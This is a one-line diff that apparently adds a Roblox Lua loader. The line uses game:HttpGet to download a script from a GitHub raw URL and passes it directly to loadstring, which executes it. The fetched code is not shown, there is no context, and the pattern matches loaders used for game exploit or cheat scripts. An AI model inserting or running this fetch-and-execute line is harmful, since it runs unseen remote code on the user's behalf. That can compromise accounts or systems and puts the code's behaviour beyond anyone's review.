@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/Sezemi/Aki2/refs/heads/main/sez'))()
